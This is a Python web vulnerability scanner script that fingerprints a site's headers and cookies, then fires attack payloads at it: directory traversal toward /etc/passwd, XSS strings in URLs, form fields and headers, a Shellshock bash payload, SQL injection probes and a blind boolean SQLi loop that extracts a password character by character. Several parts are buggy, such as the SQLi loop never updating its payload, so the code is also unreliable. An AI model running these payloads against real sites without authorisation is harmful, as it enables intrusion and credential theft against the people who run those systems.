import sys
import requests
import os
print("Initiating Scan ->"+str(sys.argv[1]))
if(str(sys.argv[1]).__contains__("--help")):
    print('Python AppScan.py [https OR http]://[Domain]')
else:
    if(str(sys.argv[1]).__contains__("http")):

        print("---------------------------------------------------------")
        print("Fingerprinting servers through HTTP headers")
        print("---------------------------------------------------------")

        req = requests.get(str(sys.argv[1]))
        headers = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code']

        for header in headers:
            try:
              result = req.headers[header]
              print('%s: %s' % (header, result))
            except:
               print('%s: Not found' % header)



        print("---------------------------------------------------------")
        print("Checking Cookie Security Headers")
        print("---------------------------------------------------------")
        req = requests.get(str(sys.argv[1]))

        for cookie in req.cookies:
            print('Name:', cookie.name)
            print('Value:', cookie.value)

            if not cookie.secure:
                cookie.secure = 'False'
            print('Secure:', cookie.secure)

            if 'httponly' in cookie._rest.keys():
                cookie.httponly = 'True'
            else:
                cookie.httponly = 'False'
            print('HTTPOnly:', cookie.httponly)

            if cookie.domain_initial_dot:
                cookie.domain_initial_dot = 'True'
            print('Loosly defined domain:', cookie.domain_initial_dot, '\n')




        print("---------------------------------------------------------")
        print("Checking Htttp Security headers")
        print("---------------------------------------------------------")
        url = str(sys.argv[1])
        req = requests.get(url)
        print(url, 'report:')

        try:
            xssprotect = req.headers['X-XSS-Protection']
            if xssprotect != '1; mode=block':
                print('X-XSS-Protection not set properly, XSS may be possible:', xssprotect)
        except:
               print('X-XSS-Protection not set, XSS may be possible')

        try:
               contenttype = req.headers['X-Content-Type-Options']
               if contenttype != 'nosniff':
                   print('X-Content-Type-Options not set properly:', contenttype)
        except:
               print('X-Content-Type-Options not set')

        try:
               hsts = req.headers['Strict-Transport-Security']
        except:
               print('HSTS header not set, MITM attacks may be possible')

        try:
               csp = req.headers['Content-Security-Policy']
               print('Content-Security-Policy set:', csp)
        except:
               print('Content-Security-Policy missing')



        print("---------------------------------------------------------")
        print("Checking Htttp Methods")
        print("---------------------------------------------------------")
        verbs = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
        for verb in verbs:
            req = requests.request(verb, url)
            print(verb, req.status_code, req.reason)
            if verb == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
                print('Possible Cross Site Tracing vulnerability found')
        print("---------------------------------------------------------")
        print("Checking URL-based Directory Traversal")
        print("---------------------------------------------------------")

        url = sys.argv[1]
        try:

            payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
            up = "../"
            i = 0
            for payload, string in (payloads.items()):
                for i in range(7):

                    req = requests.post(url + (i * up) + payload)

                    if string in req.text:
                        print("Parameter vulnerable\r\n")
                        print("Attack string: " + (i * up) + payload + "\r\n")
                        print(req.text)
                        break
        except:
            print('Not Found')
        print("---------------------------------------------------------")
        print("Checking URL-based Cross-site scripting")
        print("---------------------------------------------------------")

        url = sys.argv[1]
        payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
        for payload in payloads:
            req = requests.post(url + payload)
            if payload in req.text:
                print("Parameter vulnerable\r\n")
                print("Attack string: " + payload)
                print(req.text)
                break
        print("---------------------------------------------------------")
        print("Checking parameter-based Cross-site scripting")
        print("---------------------------------------------------------")
        import requests
        import sys
        from bs4 import BeautifulSoup, SoupStrainer


        payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
        initial = requests.get(url)
        for payload in payloads:
            d = {}
            for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
                if field.has_attr('name'):
                    if field['name'].lower() == "submit":
                        d[field['name']] = "submit"
                    else:
                        d[field['name']] = payload
            reqss = requests.post(url, data=d)
            checkresult = requests.get(url)

            if payload in checkresult.text or payload in reqss.text:
                print("Full string returned")
                print("Attack string: " + payload)

        print("---------------------------------------------------------")
        print("Checking jQuery")
        print("---------------------------------------------------------")

        import re


        scripts = []

        if len(sys.argv) != 2:
            print
            "usage: %s url" % (sys.argv[0])
            sys.exit(0)

        tarurl = sys.argv[1]
        url = requests.get(tarurl)
        soup = BeautifulSoup(url.text)
        for line in soup.find_all('script'):
            newline = line.get('src')
            scripts.append(newline)

        for script in scripts:
            if "jquery.min" in str(script).lower():
                url = requests.get(script)
                versions = re.findall(r'\d[0-9a-zA-Z._:-]+', url.text)
                if versions[0] == "2.1.1" or versions[0] == "1.12.1":
                    print("Up to date")
                else:
                    print("Out of date")
                    print("Version detected: " + versions[0])
        print("---------------------------------------------------------")
        print("Checking Header-based Cross-site scripting")
        print("---------------------------------------------------------")
        url = sys.argv[1]
        try:
            payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY  ONLOAD=alert(1)>']
            headers = {}
            r = requests.head(url)
            for payload in payloads:
                for header in r.headers:
                    headers[header] = payload
                req = requests.post(url, headers=headers)
        except:
            print("Wrong Url selection")
        print("---------------------------------------------------------")
        print("Checking Shellshock checking")
        print("---------------------------------------------------------")

        url = sys.argv[1]
        payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
        headers = {}
        r = requests.head(url)
        for header in r.headers:
            if header == "referer" or header == "User-Agent":
                headers[header] = payload
        req = requests.post(url, headers=headers)
        print("---------------------------------------------------------")
        print("Checking SQLi")
        print("---------------------------------------------------------")
        print("Checking jitter")
        print("---------------------------------------------------------")

        url = sys.argv[1]

        values = []

        for i in range(100):
            r = requests.get(url)
            values.append(int(r.elapsed.total_seconds()))

        average = sum(values) / float(len(values))
        print ("Average response time -> "+url+" --> " +str(average));
        print("---------------------------------------------------------")
        print("Checking jitter")
        print("---------------------------------------------------------")

        url = sys.argv[1]

        values = []

        for i in range(100):
            r = requests.get(url)
            values.append(int(r.elapsed.total_seconds()))

        average = sum(values) / float(len(values))
        print("Average response time -> " + url + " --> " + str(average));
        print("---------------------------------------------------------")
        print("Checking URL-based SQLi")
        print("---------------------------------------------------------")


        initial = "\'"

        first = requests.post(url + initial)

        if "mysql" in first.text.lower():
            print ("Injectable MySQL detected")
        elif("native client" in first.text.lower()):
            print ("Injectable MSSQL detected")
        elif("Syntax error" in first.text.lower()):
            print ("Injectable PostGRES detected")
        elif ("ORA" in first.text.lower()):
            print ("Injectable Oracle detected")
        else:
            print ("Not Injectable")
        print("---------------------------------------------------------")
        print("Checking Boolean SQLi")
        print("---------------------------------------------------------")


        yes = sys.argv[1]

        i = 1
        asciivalue = 1
        try:

            answer = []

            payload = {'injection': '\'AND char_length(password) = ' + str(i) + ';#', 'Submit': 'submit'}

            while True:
                req = requests.post('<target url>',data = payload)
                lengthtest = req.text
                if yes in lengthtest:
                    length = i
                    break
                else:
                    i = i + 1

            for x in range(1, length):
                while (asciivalue < 126):
                    payload = {'injection': '\'AND (substr(password, ' + str(x) + ', 1)) = ' + chr(asciivalue) + ';#','Submit': 'submit'}
                    req = requests.post('<target url>', data=payload)
                    if yes in req.text:
                        answer.append(chr(asciivalue))
                        break
                    else:
                         asciivalue = asciivalue + 1
                         pass
            asciivalue = 0
            print ("Recovered String: "+ ''.join(answer))
        except:
            print('Not found')
        print("---------------------------------------------------------")





    else:
        print("Mention http or https")

